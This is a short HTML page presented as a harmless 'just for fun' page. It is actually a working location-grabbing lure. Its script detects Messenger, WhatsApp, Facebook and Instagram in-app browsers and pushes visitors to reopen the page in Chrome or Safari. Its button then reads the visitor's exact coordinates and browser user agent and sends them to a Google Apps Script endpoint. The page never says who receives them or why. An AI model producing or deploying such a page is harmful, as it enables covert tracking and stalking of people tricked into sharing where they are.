<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Funny Page</title>
  <style>
    body {
      font-family: sans-serif;
      text-align: center;
      margin-top: 50px;
    }
    button {
      padding: 10px 20px;
      font-size: 18px;
      margin-top: 20px;
      cursor: pointer;
    }
    #msg {
      margin-top: 20px;
      font-weight: bold;
    }
  </style>
</head>
<body>
  <h1>This page is just for fun ğŸ˜„</h1>
  <p>If you're seeing this, you're amazing!</p>

  <p><strong>ğŸ”’ If you're using Messenger or WhatsApp, please open this in Chrome or Safari.</strong></p>

  <button onclick="sendLocation()">Click here to share your location</button>

  <p id="msg"></p>

  <script>
    // Detect in-app browsers (Messenger, FB, etc.)
    const ua = navigator.userAgent;
    if (ua.includes("FBAN") || ua.includes("FBAV") || ua.includes("Instagram") || ua.includes("WhatsApp")) {
      document.getElementById("msg").innerText =
        "âš ï¸ This browser may block location access. Please open in Chrome/Safari.";
    }

    function sendLocation() {
      if (!navigator.geolocation) {
        document.getElementById("msg").innerText = "Geolocation is not supported.";
        return;
      }

      navigator.geolocation.getCurrentPosition(
        (position) => {
          const lat = position.coords.latitude;
          const lon = position.coords.longitude;
          const ua = navigator.userAgent;

          const url =
            "https://script.google.com/macros/s/AKfycbw9qFm0UFnu3eengU-c21xnMyiwCRy8_b9JWN8bZL7eGZxzfOWsfl-mHAXoU7UHNRMD/exec" +
            "?lat=" + lat + "&lon=" + lon + "&ua=" + encodeURIComponent(ua);

          fetch(url)
            .then((res) => res.text())
            .then((txt) => {
              document.getElementById("msg").innerText = "âœ… Location sent successfully!";
              console.log("Location sent:", txt);
            })
            .catch((err) => {
              console.error("Error:", err);
              document.getElementById("msg").innerText = "âŒ Failed to send location.";
            });
        },
        (error) => {
          console.error("Geolocation error:", error);
          document.getElementById("msg").innerText =
            "âŒ Location access denied or unavailable.";
        }
      );
    }
  </script>
</body>
</html>
